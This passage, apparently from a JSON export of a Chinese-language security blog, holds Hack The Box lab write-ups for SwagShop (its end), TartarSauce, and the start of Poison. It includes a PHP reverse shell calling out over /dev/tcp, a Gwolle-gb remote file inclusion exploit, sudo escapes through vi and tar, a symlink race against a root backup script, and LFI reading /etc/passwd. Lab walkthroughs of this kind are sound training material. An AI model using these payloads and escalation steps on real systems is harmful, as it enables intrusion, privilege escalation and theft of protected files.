May  7  2014 .htaccess.sample\n-rw-r--r--  1 www-data www-data  10679 May  7  2014 LICENSE.html\n-rw-r--r--  1 www-data www-data  10410 May  7  2014 LICENSE.txt\n-rw-r--r--  1 www-data www-data  10421 May  7  2014 LICENSE_AFL.txt\n-rw-r--r--  1 www-data www-data 585086 May  7  2014 RELEASE_NOTES.txt\n-rw-r--r--  1 www-data www-data   2834 May  7  2014 api.php\ndrwxr-xr-x  6 www-data www-data   4096 Nov 12  2021 app\n-rw-r--r--  1 www-data www-data   2831 May  7  2014 cron.php\n-rw-r--r--  1 www-data www-data    717 May  7  2014 cron.sh\ndrwxr-xr-x  3 www-data www-data   4096 Nov 12  2021 errors\n-rw-r--r--  1 www-data www-data   1150 May  7  2014 favicon.ico\n-rw-r--r--  1 www-data www-data   5979 May  7  2014 get.php\ndrwxr-xr-x  2 www-data www-data   4096 Nov 12  2021 includes\n-rw-r--r--  1 www-data www-data   2642 May  7  2014 index.php\n-rw-r--r--  1 www-data www-data   2366 May  7  2014 index.php.sample\n-rw-r--r--  1 www-data www-data   6441 May  7  2014 install.php\ndrwxr-xr-x 12 www-data www-data   4096 Nov 12  2021 js\ndrwxr-xr-x 13 www-data www-data   4096 Nov 12  2021 lib\n-rw-r--r--  1 www-data www-data   1319 May  7  2014 mage\ndrwxrwxrwx  8 www-data www-data   4096 Nov 12  2021 media\n-rw-r--r--  1 www-data www-data    886 May  7  2014 php.ini.sample\ndrwxr-xr-x  2 www-data www-data   4096 Nov 12  2021 pkginfo\ndrwxr-xr-x  2 www-data www-data   4096 Nov 12  2021 shell\ndrwxr-xr-x  5 www-data www-data   4096 Nov 12  2021 skin\ndrwxr-xr-x 10 www-data www-data   4096 Feb 16 13:54 var\n```\n我们可以看到，`/var/www/html/` 目录下的东西还是挺多的\n\n> [https://gtfobins.github.io/gtfobins/vi/](https://gtfobins.github.io/gtfobins/vi/)\n\n根据 `GTFOBins` 上的提示，我们在 vi 编辑中，使用 :shell 即可获得权限\n\n那我们去随便执行一个吧\n\n```bash\nsudo /usr/bin/vi /var/www/html/index.php\n```\n执行后按 ESC，然后输入 `:shell` 即可\n\n```bash\nroot@swagshop:/var/www/html# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n成功提权到 root 权限\n\n```bash\nroot@swagshop:/var/www/html# cat /home/haris/user.txt\ncat /home/haris/user.txt\n370cc7d01561ab4da02e53de7ef8d799\n```\n成功拿到 user 权限的 flag 文件\n\n```bash\nroot@swagshop:/var/www/html# cat /root/root.txt\ncat /root/root.txt\n295e684ef53b47af9e6fc69a3301ee26\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"TartarSauce - Hackthebox","url":"/2023/02/11/Hackthebox/Medium/Hackthebox-TartarSauce/","content":"\n# Hackthebox - TartarSauce\n# 靶场信息\n![](Hackthebox-TartarSauce/r_-P599O8q_Wbsy3FMDnFnaH4SxI9BezyiAMBx5z8yo.png)\n\n# 靶场类型\n![](Hackthebox-TartarSauce/Dp0ihy89fshrjZMpPIPwXyNmpCeR1C9YqAUc-73dCc8.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.10.88\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-02-11 20:30 CST\nWarning: 10.10.10.88 giving up on port because retransmission cap hit (10).\nNmap scan report for 10.10.10.88\nHost is up (0.095s latency).\nNot shown: 65534 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n| http-robots.txt: 5 disallowed entries \n| /webservices/tar/tar/source/ \n| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ \n|_/webservices/developmental/ /webservices/phpmyadmin/\n|_http-title: Landing Page\n|_http-server-header: Apache/2.4.18 (Ubuntu)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=2/11%OT=80%CT=1%CU=43534%PV=Y%DS=2%DC=T%G=Y%TM=63E78A9\nOS:C%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=A)SEQ\nOS:(SP=108%GCD=1%ISR=10D%TI=Z%II=I%TS=A)OPS(O1=M537ST11NW7%O2=M537ST11NW7%O\nOS:3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11NW7%O6=M537ST11)WIN(W1=7120%W2=\nOS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M537NNSN\nOS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D\nOS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O\nOS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W\nOS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R\nOS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 256/tcp)\nHOP RTT       ADDRESS\n1   117.74 ms 10.10.16.1\n2   74.70 ms  10.10.10.88\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 44.31 seconds\n```\n## Http\n![](Hackthebox-TartarSauce/XbqDpUuXQ7gm0y8MheSMN27-njpRR4k1Iwc3hyKGsqs.png)\n\n这什么玩意儿，虽然知道是字符组成的图案，但是我确实看不出来是啥\n\n```bash\n<!--Carry on, nothing to see here :D-->\n```\n源代码拉到最底下，有一句这里没什么好看的，挺皮的\n\n```bash\n/webservices/tar/tar/source/ \n/webservices/monstra-3.0.4/\n/webservices/easy-file-uploader/ \n/webservices/developmental/\n/webservices/phpmyadmin/\n```\n在 nmap 扫描的时候，有几个目录，挨个去看一下\n\n`http://10.10.10.88/webservices/monstra-3.0.4/` 然后只有这一个地址可以访问\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# searchsploit monstra 3.0.4    \n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                   |  Path\n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nMonstra CMS 3.0.4 - (Authenticated) Arbitrary File Upload / Remote Code Execution                                                                                                | php/webapps/43348.txt\nMonstra CMS 3.0.4 - Arbitrary Folder Deletion                                                                                                                                    | php/webapps/44512.txt\nMonstra CMS 3.0.4 - Authenticated Arbitrary File Upload                                                                                                                          | php/webapps/48479.txt\nMonstra cms 3.0.4 - Persitent Cross-Site Scripting                                                                                                                               | php/webapps/44502.txt\nMonstra CMS 3.0.4 - Remote Code Execution (Authenticated)                                                                                                                        | php/webapps/49949.py\nMonstra CMS < 3.0.4 - Cross-Site Scripting (1)                                                                                                                                   | php/webapps/44855.py\nMonstra CMS < 3.0.4 - Cross-Site Scripting (2)                                                                                                                                   | php/webapps/44646.txt\nMonstra-Dev 3.0.4 - Cross-Site Request Forgery (Account Hijacking)                                                                                                               | php/webapps/45164.txt\n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\n这个版本的 Monstra CMS 确实是可以搜索到漏洞，这个先不急着看\n\n![](Hackthebox-TartarSauce/iDlsdUwiKtkX1_NW707_fjjTfOWZI3wIHYJJ8rTiLEc.png)\n\n点击首页的登录，可以进入登录页面\n\n![](Hackthebox-TartarSauce/KIZu6PkFGOUI66atVy_1dVwalwBg70ljx_S9Mds-gwM.png)\n\n弱口令 admin/admin 成功登录\n\n根据我们找到的几个漏洞，其中一个为文件上传，我 exploit 利用没成功，我去手动试试\n\n点击 Dashboard -> upload file -> select file -> upload\n\n![](Hackthebox-TartarSauce/LsGslvLMiJjHisKe383Kn92-CC09YEszbeaCqS9z1fg.png)\n\n这里利用没有成功，我又琢磨了一阵，发现是个兔子洞\n\n## Fuzz\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ffuf -u \"http://10.10.10.88/webservices/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.10.88/webservices/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 200\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\nwp                      [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 93ms]\n                        [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 75ms]\n:: Progress: [30000/30000] :: Job [1/1] :: 219 req/sec :: Duration: [0:00:26] :: Errors: 2 ::\n```\n这里发现有个 wp\n\n![](Hackthebox-TartarSauce/7GbneiIK6JODYwFQsNlE0TQr-qPip5fWpiD0dtV8XwI.png)\n\n但是没有页面\n\n尝试访问 `http://10.10.10.88/webservices/wp/wp-admin/` 的时候，跳转到了 `tartarsauce.htb` ，去加入一个 hosts 解析\n\n```bash\necho 10.10.10.88 tartarsauce.htb >> /etc/hosts\n```\n![](Hackthebox-TartarSauce/fRJdFpiu8A0WrXKO51rYxYR4jpKK7wwmKEBZsNXZL2E.png)\n\n然后再访问就有页面了，咱们去访问一下 wp-admin 页面\n\n![](Hackthebox-TartarSauce/samtLgMBiZ5iW5IyEFbC0eAYSXoFzbZRoOOnz9liaLg.png)\n\n成功找到后台，这个时候去使用 wpscan 扫描一下\n\n## Wpscan\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# wpscan --url http://10.10.10.88/webservices/wp/ --enumerate p --plugins-detection aggressive\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.22\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://10.10.10.88/webservices/wp/ [10.10.10.88]\n[+] Started: Sat Feb 11 21:10:03 2023\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://10.10.10.88/webservices/wp/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://10.10.10.88/webservices/wp/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://10.10.10.88/webservices/wp/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).\n | Found By: Emoji Settings (Passive Detection)\n |  - http://10.10.10.88/webservices/wp/, Match: 'wp-includes\\/js\\/wp-emoji-release.min.js?ver=4.9.4'\n | Confirmed By: Meta Generator (Passive Detection)\n |  - http://10.10.10.88/webservices/wp/, Match: 'WordPress 4.9.4'\n\n[i] The main theme could not be detected.\n\n[+] Enumerating Most Popular Plugins (via Aggressive Methods)\n Checking Known Locations - Time: 00:00:50 <=================================================================================================================================> (1500 / 1500) 100.00% Time: 00:00:50\n[+] Checking Plugin Versions (via Passive and Aggressive Methods)\n\n[i] Plugin(s) Identified:\n\n[+] akismet\n | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/\n | Last Updated: 2022-12-01T17:18:00.000Z\n | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt\n | [!] The version is out of date, the latest version is 5.0.2\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/, status: 200\n |\n | Version: 4.0.3 (100% confidence)\n | Found By: Readme - Stable Tag (Aggressive Detection)\n |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt\n | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)\n |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt\n\n[+] gwolle-gb\n | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/\n | Last Updated: 2023-01-24T11:28:00.000Z\n | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt\n | [!] The version is out of date, the latest version is 4.5.0\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200\n |\n | Version: 2.3.10 (100% confidence)\n | Found By: Readme - Stable Tag (Aggressive Detection)\n |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt\n | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)\n |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt\n\n[!] No WPScan API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\n\n[+] Finished: Sat Feb 11 21:10:56 2023\n[+] Requests Done: 1511\n[+] Cached Requests: 31\n[+] Data Sent: 449.789 KB\n[+] Data Received: 272.615 KB\n[+] Memory used: 194.531 MB\n[+] Elapsed time: 00:00:53\n```\n可以得知 wordpress 版本是 4.9.，并且有一个 Gwolle 插件，切在插件的 readme 页面中有说明版本号为 1.5.3\n\n> [https://www.exploit-db.com/exploits/38861](https://www.exploit-db.com/exploits/38861)\n\n根据描述，找到了一个漏洞\n\n# 漏洞利用\n根据漏洞中的描述，我们来构造一下 exploit\n\n```bash\nhttp://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]\n\ncurl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.6/\n```\n上面是我们之后要运行的内容\n\n```bash\n<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.6/4444 0>&1'\") ?>\n```\n上面是我们的 exploit 请求的 shell 文件的内容，文件名字为 wp-load.php\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# python3 -m http.server 80                                                             \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\n接着使用 python3 运行一个 http 服务器\n\n```bash\nnc -nvlp 4444\n```\n接着使用 nc 监听一个端口\n\n最后去执行我们的 exploit\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# rlwrap nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.16.6] from (UNKNOWN) [10.10.10.88] 33670\nbash: cannot set terminal process group (1261): Inappropriate ioctl for device\nbash: no job control in this shell\n</wp/wp-content/plugins/gwolle-gb/frontend/captcha$ whoami&&id\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n成功返回 shell\n\n# 权限提升\n## User\n```bash\n</wp/wp-content/plugins/gwolle-gb/frontend/captcha$ sudo -l\nsudo -l\nMatching Defaults entries for www-data on TartarSauce:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser www-data may run the following commands on TartarSauce:\n    (onuma) NOPASSWD: /bin/tar\n```\n使用 `sudo -l` 可以看到，我们可以使用 onuma 权限执行 `/bin/tar` \n\n> [https://gtfobins.github.io/gtfobins/tar/](https://gtfobins.github.io/gtfobins/tar/)\n\n![](Hackthebox-TartarSauce/CuT7l_OxvG7V09LZWYifGLJnK3a3anrT16MtDRef3fQ.png)\n\n```bash\nsudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh\n```\n```bash\nwhoami&&id\nonuma\nuid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)\n```\n成功提权到 user 权限\n\n```bash\ncat user.txt\n140682a65dccf6fbd674edb57692ae4c\n```\n成功拿到 user 权限的 flag 文件\n\n## Root\n```bash\n2023/02/11 08:40:29 CMD: UID=0     PID=3580   | /bin/bash /usr/sbin/backuperer \n```\n运行 pspy 可以看到，会定时以 root 权限执行 /usr/sbin/backuperer 这个文件，去查看一下\n\n```bash\nfile /usr/sbin/backuperer \n/usr/sbin/backuperer: Bourne-Again shell script, UTF-8 Unicode text executable\n\ncat /usr/sbin/backuperer \n#!/bin/bash\n\n#-------------------------------------------------------------------------------------\n# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ\n# ONUMA Dev auto backup program\n# This tool will keep our webapp backed up incase another skiddie defaces us again.\n# We will be able to quickly restore from a backup in seconds ;P\n#-------------------------------------------------------------------------------------\n\n# Set Vars Here\nbasedir=/var/www/html\nbkpdir=/var/backups\ntmpdir=/var/tmp\ntestmsg=$bkpdir/onuma_backup_test.txt\nerrormsg=$bkpdir/onuma_backup_error.txt\ntmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)\ncheck=$tmpdir/check\n\n# formatting\nprintbdr()\n{\n    for n in $(seq 72);\n    do /usr/bin/printf $\"-\";\n    done\n}\nbdr=$(printbdr)\n\n# Added a test file to let us see when the last backup was run\n/usr/bin/printf $\"$bdr\\nAuto backup backuperer backup last ran at : $(/bin/date)\\n$bdr\\n\" > $testmsg\n\n# Cleanup from last time.\n/bin/rm -rf $tmpdir/.* $check\n\n# Backup onuma website dev files.\n/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &\n\n# Added delay to wait for backup to complete if large files get added.\n/bin/sleep 30\n\n# Test the backup integrity\nintegrity_chk()\n{\n    /usr/bin/diff -r $basedir $check$basedir\n}\n\n/bin/mkdir $check\n/bin/tar -zxvf $tmpfile -C $check\nif [[ $(integrity_chk) ]]\nthen\n    # Report errors so the dev can investigate the issue.\n    /usr/bin/printf $\"$bdr\\nIntegrity Check Error in backup last ran :  $(/bin/date)\\n$bdr\\n$tmpfile\\n\" >> $errormsg\n    integrity_chk >> $errormsg\n    exit 2\nelse\n    # Clean up and save archive to the bkpdir.\n    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak\n    /bin/rm -rf $check .*\n    exit 0\nfi\n```\n### 脚本分析\n```bash\n生成工作目录和随机临时文件名\n打印标题\n生成测试消息\n清理\n将用户上下文更改为 onuma 并将 /var/www/html 备份到临时文件中\n睡 30 秒\n创建用于完整性检查的目录\nunatar 新建文件到check目录\n执行 diff 以检查存档和文件系统之间的差异\n如果没有差异清理并保存新创建的存档，备份旧的\n否则将所有差异记录到日志文件\n```\n### 利用\n使用 www-data 用户在 /var/www/html 下创建空文件\n\n```bash\n</wp/wp-content/plugins/gwolle-gb/frontend/captcha$ cd /var/www/html\ncd /var/www/html\nwww-data@TartarSauce:/var/www/html$ id\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nwww-data@TartarSauce:/var/www/html$ touch 1\ntouch 1\n```\n使用 onuma 用户在 /var/tmp 下创建 var/www/html/ 结构，将 /root/root.txt 链接到 1\n\n```bash\ncd /var/tmp\npwd\n/var/tmp\nid\nuid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)\nmkdir -p var/www/html\ncd var/www/html\nln -s /root/root.txt 1\nls -la\ntotal 8\ndrwxr-xr-x 2 onuma onuma 4096 Feb 11 09:06 .\ndrwxr-xr-x 3 onuma onuma 4096 Feb 11 09:05 ..\nlrwxrwxrwx 1 onuma onuma   14 Feb 11 09:06 1 -> /root/root.txt\n```\n在 /var/tmp 中创建 tar 存档\n\n```bash\ncd /var/tmp\n/bin/tar -zcvf a.tgz var/www/html\nvar/www/html/\nvar/www/html/1\n```\n等待脚本执行，并在 30 秒内将 a.tgz 复制到临时存档\n\n```bash\nls -la\ntotal 112\ndrwxrwxrwt 11 root  root   4096 Feb 11 09:10 .\ndrwxr-xr-x 14 root  root   4096 May 12  2022 ..\n-rw-r--r--  1 onuma onuma 65536 Feb 11 09:10 .816e92e4f61e2b8dce68f5779ed42ad70a562348\n-rw-r--r--  1 onuma onuma   154 Feb 11 09:08 a.tgz\ndrwxr-xr-x  3 onuma onuma  4096 Feb 11 09:05 var\ncp a.tgz .816e92e4f61e2b8dce68f5779ed42ad70a562348\n```\n等待检查完成\n\n检查 /var/backups 下的日志文件 onuma\\_backup\\_error.txt，因为它将包含来自 /var/www/html 和 a.tgz 存档的文件之间的查意，即 /root/root.txt 的内容\n\n```bash\ncat /var/backups/onuma_backup_error.txt\n...\n------------------------------------------------------------------------\nIntegrity Check Error in backup last ran :  Thu Jan 21 05:38:54 EST 2021\n------------------------------------------------------------------------\n/var/tmp/.379fe8e77f9f84a66b9a6df9a452d10499713829\nBinary files /var/www/html/webservices/wp/.wp-config.php.swp and /var/tmp/check/var/www/html/webservices/wp/.wp-config.php.swp differ\n------------------------------------------------------------------------\nIntegrity Check Error in backup last ran :  Sat Feb 11 09:11:14 EST 2023\n------------------------------------------------------------------------\n/var/tmp/.816e92e4f61e2b8dce68f5779ed42ad70a562348\ndiff -r /var/www/html/1 /var/tmp/check/var/www/html/1\n0a1\n> 2066572c29f0ffd2a77ee5e5c2e77703\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Poison - Hackthebox","url":"/2023/02/08/Hackthebox/Medium/Hackthebox-Poison/","content":"\n# Hackthebox - Poison\n# 靶场信息\n![](Hackthebox-Poison/r2g4g065_PzTZVqmj6rTj-PmaylYAxegkrD_uJsgYzA.png)\n\n# 靶场类型\n![](Hackthebox-Poison/cQwb7l8LFd3cSGxHASQTLKQE4CfqFQE2w3H_TU2DXSw.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.10.84\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-02-08 18:38 CST\nWarning: 10.10.10.84 giving up on port because retransmission cap hit (10).\nNmap scan report for 10.10.10.84\nHost is up (0.078s latency).\nNot shown: 52168 filtered tcp ports (no-response), 13365 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)\n| ssh-hostkey: \n|   2048 e33b7d3c8f4b8cf9cd7fd23ace2dffbb (RSA)\n|   256 4ce8c602bdfc83ffc98001547d228172 (ECDSA)\n|_  256 0b8fd57185901385618beb34135f943b (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\n|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=2/8%OT=22%CT=8%CU=32827%PV=Y%DS=2%DC=T%G=Y%TM=63E37C05\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=Z%II=RI%TS=20)OP\nOS:S(O1=M537NW6ST11%O2=M537NW6ST11%O3=M280NW6NNT11%O4=M537NW6ST11%O5=M218NW\nOS:6ST11%O6=M109ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)EC\nOS:N(R=Y%DF=Y%T=40%W=FFFF%O=M537NW6SLL%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=FFFF%S=O%A=S+%F=AS%O=M109NW6ST11%RD\nOS:=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S\nOS:=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=38%UN=0%R\nOS:IPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd\n\nTRACEROUTE (using port 1720/tcp)\nHOP RTT       ADDRESS\n1   122.13 ms 10.10.16.1\n2   77.21 ms  10.10.10.84\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 89.22 seconds\n```\n## Http\n![](Hackthebox-Poison/ytG2G3HzgLZesq8DA87kxXnqd8oA6gBjqV5kftcFXy4.png)\n\n似乎是一个本地脚本加载的一个程序，挨个看一下是否有什么可用的东西\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# curl http://10.10.10.84/browse.php?file=listfiles.php\nArray\n(\n    [0] => .\n    [1] => ..\n    [2] => browse.php\n    [3] => index.php\n    [4] => info.php\n    [5] => ini.php\n    [6] => listfiles.php\n    [7] => phpinfo.php\n    [8] => pwdbackup.txt\n)\n```\n# 漏洞利用\n有点东西，这是列出了一个列表吧，然后看到文件结构，突然想到是否会有 LFI 呢？尝试一下\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# curl http://10.10.10.84/browse.php?file=/etc/passwd\n# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $\n#\nroot:*:0:0:Charlie &:/root:/bin/csh\ntoor:*:0:0:Bourne-again Superuser:/root:\ndaemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin\noperator:*:2:5:System &:/:/usr/sbin/nologin\nbin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin\ntty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin\nkmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin\ngames:*:7:13:Games pseudo-user:/:/usr/sbin/nologin\nnews:*:8:8:News Subsystem:/:/usr/sbin/nologin\nman:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin\nsshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin\nsmmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin\nmailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin\nbind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin\nunbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin\nproxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin\n_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin\n_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin\nuucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico\npop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin\nauditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin\nwww:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin\n_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin\nhast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin\nnobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin\n_tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin\nmessagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin\navahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin\ncups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin\ncharix:*:1001:1001:charix:/home/charix:/bin/csh\n```\nnice，存在 LFI 漏洞，筛选一下可用账户先\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# curl 